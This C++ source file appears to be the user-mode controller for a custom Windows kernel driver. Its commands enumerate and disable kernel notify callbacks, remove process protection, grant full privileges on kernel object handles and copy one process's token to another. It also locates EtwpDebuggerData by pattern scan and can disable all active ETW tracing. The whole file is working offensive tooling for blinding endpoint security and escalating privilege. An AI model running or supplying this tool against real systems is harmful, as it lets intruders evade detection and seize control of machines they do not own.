#include <stdio.h>
#include <stdlib.h>
#include "userland.hpp"
#include "../tKMD/ioctl.h"

void PrintCallbackInfo(CALLBACK_INFO callbacks[]);
OFFSET ValidateSupportedVersion(HANDLE hDriver);
HANDLE attachToDriver();

int main(int argc, char * argv[])
{
	BOOL success;
	OFFSET offset; 
	HANDLE hDriver; 

	if (argc < 2)
	{
		printf("Usage: .exe <int:toggle>\n\t"
			"0: (RING 0) PRINT CURRENT WINDOWS VERSION\n\t"
			"1: (RING 0) LIST KERNEL MODULES\n\t" 
			"2: (RING 0) LIST PROCESSNOTIFY CALLBACKS\n\t"
			"3: (RING 0) LIST THREADNOTIFY CALLBACKS\n\t"
			"4: (RING 0) LIST IMAGENOTIFY CALLBACKS\n\t"
			"5: (RING 0) DISABLE CALLBACK <PVOID:address>\n\t"
			"6: (RING 0) REMOVE_PS_PROTECTION FROM <int:PID>\n\t"
			"7: (RING 3) LIST KERNEL OBJECTS OF <int:PID>\n\t"
			"8: (RING 0) SET FULL PRIVS ON <int:PID> <hex:handleID>\n\t"
			"9: (RING 3) LIST KERNEL MODULES\n\t"
			"10: (RING 0) BORROW A TOKEN FOR <int:PID> FROM <int:PID>\n\t"
			"11: (RING 0) LIST ALL ACTIVE ETWs <0: list only | 1: disable all active>\n\t"
		);
		return 1;
	}

	int toggle = atoi(argv[1]);

	switch (toggle)
	{
		case 0: //READ CURRENT WINDOWS VERSION FROM KERNEL
		{
			hDriver = attachToDriver();
			WINDOWS_VERSION version;

			if (success = DeviceIoControl(hDriver, IOCTL_WINDOWS_VERSION, nullptr, 0, &version, sizeof(version), nullptr, nullptr))
			{
				printf("Current Windows Version: %lu.%lu.%lu\n", version.MajorVersion, version.MinorVersion, version.BuildNumber);
			}
			break;
		}
		case 1: //LIST KERNEL MODULES
		{
			MODULE_NAMES modules[256];
			int cDrivers = 0;
			RtlZeroMemory(modules, sizeof(modules));
			hDriver = attachToDriver();

			if (success = DeviceIoControl(hDriver, IOCTL_LIST_MODULES, nullptr, 0, &modules, sizeof(modules), nullptr, nullptr))
			{
				printf("[*] Listing all system modules...\n");
				for (auto i = 0; i < 256; i++)
				{
					if (strlen(modules[i].Name) > 0)
					{
						cDrivers++;
						printf("[%d] %s\n", i+1, modules[i].Name);
					}
				}
				printf("%d drivers detected\n", cDrivers);
			}
			break;
		}
		case 2: //LIST PROCESSNOTIFY CALLBACKS
		{
			hDriver = attachToDriver();
			offset = ValidateSupportedVersion(hDriver);
			if (offset.PROCESS_NOTIFY_OFFSET == 0x00)
			{
				printf("[-] Unfortunately, this Windows version is not supported for PROCESSNOTIFY CALLBACKS. Terminating...\n");
				exit(1);
			}

			CALLBACK_INFO callbacks[256];
			RtlZeroMemory(callbacks, sizeof(callbacks));

			printf("[*] Listing process notify callbacks...\n");
			if (success = DeviceIoControl(hDriver, IOCTL_CALLBACK_PROCESS, nullptr, 0, &callbacks, sizeof(callbacks), nullptr, nullptr)) PrintCallbackInfo(callbacks);
			break;
		}
		case 3: // LIST THREADNOTIFY CALLBACKS
		{
			hDriver = attachToDriver();

			offset = ValidateSupportedVersion(hDriver);
			if (offset.THREAD_NOTIFY_OFFSET == 0x00)
			{
				printf("[-] Unfortunately, this Windows version is not supported for THREADNOTIFY CALLBACKS. Terminating...\n");
				exit(1);
			}

			CALLBACK_INFO callbacks[256];
			RtlZeroMemory(callbacks, sizeof(callbacks));

			printf("[*] Listing thread notify callbacks...\n");
			if (success = DeviceIoControl(hDriver, IOCTL_CALLBACK_THREAD, nullptr, 0, &callbacks, sizeof(callbacks), nullptr, nullptr)) PrintCallbackInfo(callbacks);
			break;
		}
		case 4: //LIST IMAGENOTIFY CALLBACKS
		{
			hDriver = attachToDriver();

			offset = ValidateSupportedVersion(hDriver);
			if (offset.IMAGE_NOTIFY_OFFSET == 0x00)
			{
				printf("[-] Unfortunately, this Windows version is not supported for IMAGENOTIFY CALLBACKS. Terminating...\n");
				exit(1);
			}

			CALLBACK_INFO callbacks[256];
			RtlZeroMemory(callbacks, sizeof(callbacks));
		
			printf("[*] Listing image notify callbacks...\n");
			if (success = DeviceIoControl(hDriver, IOCTL_CALLBACK_IMAGE, nullptr, 0, &callbacks, sizeof(callbacks), nullptr, nullptr)) PrintCallbackInfo(callbacks);
			break;
		}
		case 5: //DISABLE CALLBACK
		{
			if (argc < 3)
			{
				printf("[-] Callback's address to be provided\n");
				exit(1);
			}

			hDriver = attachToDriver();
			unsigned long long address = strtoull(argv[2], NULL, 16);
		
			PTARGET_CALLBACK target = new TARGET_CALLBACK{ address };
			if (success = DeviceIoControl(hDriver, IOCTL_CALLBACK_REMOVE, target, sizeof(target), nullptr, 0, nullptr, nullptr))
			{
				printf("[*] Removed callback @ 0x%llx\n", address);
			}
			break;
		}
		case 6: //REMOVE PS_PROTECTION			
		{
			hDriver = attachToDriver();
			offset = ValidateSupportedVersion(hDriver);
			if (offset.PS_PROTECTION_OFFSET == 0x00)
			{
				printf("[-] Unfortunately, this Windows version is not supported for PS_PROTECTION. Terminating...\n");
				exit(1);
			}

			if (argc < 3)
			{
				printf("[-] PID to be provided\n");
				exit(1);
			}

			PTARGET_PROCESS target = new TARGET_PROCESS{ atoi(argv[2]) };

			if (success = DeviceIoControl(hDriver, IOCTL_REMOVE_PS_PROTECTION, target, sizeof(target), nullptr, 0, nullptr, nullptr))
			{
				printf("[*] Removed protection from %d\n", target->ProcessId);
			}
			else
			{
				printf("[-] error: 0x%d\n", GetLastError());
			}
			break;
		}
		case 7: //LIST KERNEL OBJECTS VIA PROCESS HANDLES
		{
			if (argc < 3)
			{
				printf("[-] PID to be provided\n");
				exit(1);
			}

			listAllKernelObjectsViaHandles(atoi(argv[2]));
			break;
		}
		case 8: //SET FULL PRIVS ON KERNEL OBJECT
		{
			if (argc < 4)
			{
				printf("[-] requires an address of the kernel object to be modified");
				exit(1);
			}

			hDriver = attachToDriver();
			int pid = std::atoi(argv[2]);
			int handleID = std::stoi(argv[3], 0, 16);

			PTARGET_HANDLE handle = new TARGET_HANDLE{ pid, handleID };

			if (success = DeviceIoControl(hDriver, IOCTL_SET_FULL_PRIVS_ON_KERNEL_OBJECT, handle, sizeof(handle), nullptr, 0, nullptr, nullptr))
			{
				printf("[+] Assigned full privs to handle 0x%x\n", handleID);
			}
			else
			{
				printf("[-] error: 0x%d\n", GetLastError());
			}
			break;
		}
		case 9: //CHECK LOADED KERNEL MODULES FROM USERLAND
		{
			listAllKernelDrivers();
			break;
		}
		case 10: //BORROW A TOKEN FOR <pid> FROM <pid>
		{
			if (argc < 4)
			{
				printf("[-] requires <borrower pid> and <lender pid>");
				exit(1);
			}

			int borrower = std::atoi(argv[2]);
			int lender = std::atoi(argv[3]);

			hDriver = attachToDriver();

			PTOKENX tokens = new TOKENX{borrower, lender};
			if (success = DeviceIoControl(hDriver, IOCTL_BORROW_TOKEN, tokens, sizeof(tokens), nullptr, 0, nullptr, nullptr))
			{
				printf("[+] a token from [%d] was assigned to [%d]\n", lender, borrower);
			}
			else
			{
				printf("[-] error: 0x%d\n", GetLastError());
			}
			break;
		}
		case 11: //LIST ALL ACTIVE ETWs
		{
			if (argc < 3)
			{
				printf("requred second paramter: 0 -> list active ETWs only, 1 -> disable all active ETWs\n");
				exit(1);
			}
			int disable = std::atoi(argv[2]);

			HMODULE Ntoskrnl;
			Ntoskrnl = LoadLibrary(L"ntoskrnl.exe");//LoadLibraryEx(L"ntkrnlmp.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
			//__debugbreak();
			if (Ntoskrnl)
			{
				printf("[*] Local copy of NTOS @ 0x%llX\n", Ntoskrnl);
			}
			//find EtwpDebuggerData fingerprint in the module
			BYTE EtwDbgFingerprint[] = { 0x2c, 0x08, 0x04, 0x38, 0x0c, 0xe8 };
			DWORD64 Location = 0;
			DWORD64* StartAddr = (DWORD64*)Ntoskrnl;

			DWORD RegionSize = 0x1000000; //lower in older versions and possibly bigger in newer version

			BYTE* address = (BYTE*)StartAddr;
			for (int i = 0; i < RegionSize; i++)
			{
				if (!memcmp(&address[i], EtwDbgFingerprint, sizeof(EtwDbgFingerprint)))
				{
					Location = (DWORD64)&address[i] - 2;
					printf("[+] Found location of EtwpDebugerData: 0x%p\n", Location);
				}
			}
			// calculate address of EtwpDebuggerData in kernel memory
			DWORD64 kernelAddress;
			LPVOID ImageBase[1000];
			DWORD cbNeeded = 0;
			EnumDeviceDrivers(ImageBase, sizeof(ImageBase), &cbNeeded);
			kernelAddress = (DWORD64)ImageBase[0];
			printf("[*] Original NTOS loaded @ 0x%llX\n", kernelAddress );
			DWORD64 EtwDbg_RVA = Location - (DWORD64)Ntoskrnl;
			DWORD64 EtwpDebuggerDataAddr = kernelAddress + EtwDbg_RVA;
			printf("[+] Found original locatiion of EtwpDebuggerData: 0x%p\n", EtwpDebuggerDataAddr);
			FreeLibrary(Ntoskrnl);
			// read up global _etw_silodriverstate from kernel
			hDriver = attachToDriver();
			DWORD64 SiloDriverState = 0;
			PETW etw = new ETW{EtwpDebuggerDataAddr, &SiloDriverState};
			etw->disable = disable;
			ETW_GUID guids[ETW_BUFFER];

			if (success = DeviceIoControl(hDriver, IOCTL_LIST_ETW, etw, sizeof(guids), &guids, sizeof(guids), nullptr, nullptr))
			{
				printf("enabled GUIDs:\n");
				for (int i = 0; i < etw->numberOfEnabledETWs; i++)
				{
					printf("\t%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x\n",
						guids[i].guid.Data1,
						guids[i].guid.Data2,
						guids[i].guid.Data3,
						guids[i].guid.Data4[0],
						guids[i].guid.Data4[1],
						guids[i].guid.Data4[2], 
						guids[i].guid.Data4[3], 
						guids[i].guid.Data4[4],
						guids[i].guid.Data4[5],
						guids[i].guid.Data4[6],
						guids[i].guid.Data4[7]);
				}
				printf("number of enabled ETWs: [%d]\n", etw->numberOfEnabledETWs);
			}
			else
			{
				printf("[-] error: 0x%d\n", GetLastError());
			}
			DWORD64 HashBucket = 0;
			
			break;
		}
	}
	CloseHandle(hDriver);
}

void PrintCallbackInfo(CALLBACK_INFO callbacks[])
{
	for (auto i = 0; i < 256; i++)
	{
		if (callbacks[i].Address == 0) continue;
		printf("\t[%d] 0x%llx -> %s\n", i, callbacks[i].Address, callbacks[i].Module);
	}
}

OFFSET ValidateSupportedVersion(HANDLE hDriver)
{
	OFFSET offset;
	if (!DeviceIoControl(hDriver, IOCTL_SUPPORTED_VERSION, nullptr, 0, &offset, sizeof(OFFSET), nullptr, nullptr))
	{
		printf("[-] IOCTL_SUPPORTED_VERSION: Could not be validated. Terminating...\n");
		exit(1);
	}
	return offset;
}

HANDLE attachToDriver()
{
	HANDLE hDriver;

	hDriver = CreateFile(L"\\\\.\\tKMD", GENERIC_WRITE, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hDriver == INVALID_HANDLE_VALUE)
	{
		printf("[-] failed to open a handle to the driver: %d\n", GetLastError());
		exit(1);
	}

	return hDriver;
}